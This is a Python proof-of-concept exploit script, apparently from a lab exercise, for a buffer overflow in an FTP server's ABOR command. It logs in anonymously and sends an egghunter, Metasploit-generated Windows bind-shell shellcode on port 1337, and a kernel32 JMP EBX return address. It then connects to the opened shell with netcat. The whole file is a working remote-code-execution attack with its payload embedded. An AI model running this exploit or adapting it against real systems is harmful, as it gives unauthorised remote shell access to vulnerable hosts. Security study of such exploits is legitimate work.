#!/usr/bin/env python3

import socket
import sys
import os
import time

ip = "192.168.56.132"
port = 21

#EIP overwritten after 1063 bytes
# JMP EBX (7C8192BA) address in module kernel32.dll
# bad chars = \x00\x0a\x0d\xff
# Msfvenom payload:
# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread LPORT=1337 -f c -b '\x00\x0a\x0d\xff'
# 355 bytes
# Egghunter , tag n00b : 
# "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
# "\xef\xb8\x6e\x30\x30\x62\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# Put this tag in front of your shellcode : n00bn00b

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x6e\x30\x30\x62\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

shellcode = ("n00bn00b" +
"\xdb\xcf\xd9\x74\x24\xf4\xb8\x58\x2a\x25\xc5\x5e\x31\xc9\xb1"
"\x53\x31\x46\x17\x03\x46\x17\x83\xb6\xd6\xc7\x30\xba\xcf\x8a"
"\xbb\x42\x10\xeb\x32\xa7\x21\x2b\x20\xac\x12\x9b\x22\xe0\x9e"
"\x50\x66\x10\x14\x14\xaf\x17\x9d\x93\x89\x16\x1e\x8f\xea\x39"
"\x9c\xd2\x3e\x99\x9d\x1c\x33\xd8\xda\x41\xbe\x88\xb3\x0e\x6d"
"\x3c\xb7\x5b\xae\xb7\x8b\x4a\xb6\x24\x5b\x6c\x97\xfb\xd7\x37"
"\x37\xfa\x34\x4c\x7e\xe4\x59\x69\xc8\x9f\xaa\x05\xcb\x49\xe3"
"\xe6\x60\xb4\xcb\x14\x78\xf1\xec\xc6\x0f\x0b\x0f\x7a\x08\xc8"
"\x6d\xa0\x9d\xca\xd6\x23\x05\x36\xe6\xe0\xd0\xbd\xe4\x4d\x96"
"\x99\xe8\x50\x7b\x92\x15\xd8\x7a\x74\x9c\x9a\x58\x50\xc4\x79"
"\xc0\xc1\xa0\x2c\xfd\x11\x0b\x90\x5b\x5a\xa6\xc5\xd1\x01\xaf"
"\x2a\xd8\xb9\x2f\x25\x6b\xca\x1d\xea\xc7\x44\x2e\x63\xce\x93"
"\x51\x5e\xb6\x0b\xac\x61\xc7\x02\x6b\x35\x97\x3c\x5a\x36\x7c"
"\xbc\x63\xe3\xe9\xb4\xc2\x5c\x0c\x39\xb4\x0c\x90\x91\x5d\x47"
"\x1f\xce\x7e\x68\xf5\x67\x16\x95\xf6\x82\xde\x10\x10\xe6\x30"
"\x75\x8a\x9e\xf2\xa2\x03\x39\x0c\x81\x3b\xad\x45\xc3\xfc\xd2"
"\x55\xc1\xaa\x44\xde\x06\x6f\x75\xe1\x02\xc7\xe2\x76\xd8\x86"
"\x41\xe6\xdd\x82\x31\x8b\x4c\x49\xc1\xc2\x6c\xc6\x96\x83\x43"
"\x1f\x72\x3e\xfd\x89\x60\xc3\x9b\xf2\x20\x18\x58\xfc\xa9\xed"
"\xe4\xda\xb9\x2b\xe4\x66\xed\xe3\xb3\x30\x5b\x42\x6a\xf3\x35"
"\x1c\xc1\x5d\xd1\xd9\x29\x5e\xa7\xe5\x67\x28\x47\x57\xde\x6d"
"\x78\x58\xb6\x79\x01\x84\x26\x85\xd8\x0c\x46\x64\xc8\x78\xef"
"\x31\x99\xc0\x72\xc2\x74\x06\x8b\x41\x7c\xf7\x68\x59\xf5\xf2"
"\x35\xdd\xe6\x8e\x26\x88\x08\x3c\x46\x99")

def exploit_faze():
	exploit = shellcode + '\x90' * (1063 - (len(shellcode) + len(egghunter))) + egghunter + '\xBA\x92\x81\x7C' + '\x90' * 205

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a socket for TCP connection
	s.connect((ip,port))
	print(s.recv(1024))
	time.sleep(5)
	s.recv(2000)
	s.send(b'USER anonymous\r\n')
	print(s.recv(2000))
	s.send(b'PASS anonymous\r\n')
	print(s.recv(2000))
	s.send(bytes('ABOR ' + exploit + '\r\n','latin-1'))
	print("Exploit length is [%d] bytes\n" % len(exploit))
	s.close()
	print("--------------------------------------------------------------------\n")
	print("Executing Exploit...\n")
	print("You should be able to connect to the target on port 1337 in 10 sec\n")
	print("--------------------------------------------------------------------\n")
	time.sleep(10)
	os.system("nc -n " + ip + " 1337")

def main():
	print("--------------------------------------------------------------------\n")
	print("\t\t Proof Of Concept by N3R0 (2020)\n")
	print("--------------------------------------------------------------------\n")
	exploit_faze()

main()
